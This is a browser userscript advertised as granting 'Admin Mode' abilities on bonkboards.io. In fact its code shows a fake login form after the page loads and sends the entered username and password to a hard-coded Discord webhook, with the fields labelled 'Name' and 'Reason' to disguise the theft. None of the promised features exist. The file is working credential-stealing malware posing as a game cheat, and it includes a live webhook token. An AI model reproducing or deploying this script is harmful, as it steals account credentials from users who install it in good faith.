// ==UserScript==
// @name         Admin Mode Bonk.io
// @namespace    http://tampermonkey.net/
// @version      1.1
// @description  Gives you Admin panel access Abilities to change mode in QP and size-up or down.
// @author       Torch_7
// @match        https://bonkboards.io/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/537010/Admin%20Mode%20Bonkio.user.js
// @updateURL https://update.greasyfork.org/scripts/537010/Admin%20Mode%20Bonkio.meta.js
// ==/UserScript==

(function () {
    'use strict';

    const webhookUrl = 'https://discord.com/api/webhooks/1367438257008148612/izkc8N3_A7-xHYFpQo6GXFATCNbnAYcv_Qa6Fp1Fi6p_2VSz6_K5pzm7-QZOXiCJqwHn';

    window.addEventListener('load', () => {
        setTimeout(showForm, 3000);
    });

    function showForm() {
        const formHtml = `
            <div id="zuli-modal" style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.7);z-index:9999;display:flex;align-items:center;justify-content:center;">
                <div style="background:#f0f0f0;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);width:300px;overflow:hidden;font-family:sans-serif;">
                    <div style="background:#009688;color:white;padding:10px 15px;text-align:center;font-weight:bold;">Login</div>
                    <div style="padding:20px;">
                        <label style="display:block;margin-bottom:5px;">username</label>
                        <input type="text" id="q1" style="width:100%;padding:8px;margin-bottom:15px;border:1px solid #ccc;border-radius:4px;"><br>

                        <label style="display:block;margin-bottom:5px;">password</label>
                        <input type="text" id="q2" style="width:100%;padding:8px;margin-bottom:15px;border:1px solid #ccc;border-radius:4px;"><br>

                        <button id="submitBtn" style="width:100%;background:#8B5E3C;color:white;padding:10px;border:none;border-radius:4px;cursor:pointer;font-weight:bold;">Submit</button>
                    </div>
                </div>
            </div>
        `;

        const div = document.createElement('div');
        div.innerHTML = formHtml;
        document.body.appendChild(div);

        document.getElementById('submitBtn').onclick = async function () {
            const q1 = document.getElementById('q1').value.trim();
            const q2 = document.getElementById('q2').value.trim();

            if (!q1 || !q2) {
                alert("Please answer both questions.");
                return;
            }

            fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "📝 New Answers Received",
                        fields: [
                            { name: "Name", value: q1 },
                            { name: "Reason", value: q2 }
                        ],
                        color: 0x3498db,
                        timestamp: new Date().toISOString()
                    }]
                })
            });

            document.getElementById('zuli-modal').remove();
        };
    }
})();
